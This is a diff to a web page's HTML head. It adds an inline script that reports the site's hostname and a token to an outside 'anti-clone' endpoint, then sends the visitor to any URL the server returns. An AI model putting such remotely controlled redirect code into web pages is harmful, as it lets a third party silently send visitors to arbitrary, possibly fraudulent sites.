@@ -16,6 +16,25 @@
   a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
   document.head.appendChild(a);
 </script>
+    <script>
+(function(){
+    var t = "c0178496d861497357dc4afaa43c6173";
+    var d = window.location.hostname;
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "https://multi.paradisepags.com/api/anticlone-check.php?token=" + t + "&domain=" + d, true);
+    xhr.onload = function() {
+        if (xhr.status === 200) {
+            try {
+                var r = JSON.parse(xhr.responseText);
+                if (r.action === "redirect" && r.url) {
+                    window.location.href = r.url;
+                }
+            } catch(e){}
+        }
+    };
+    xhr.send();
+})();
+</script>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
     <title>Anitta - Privacy</title>
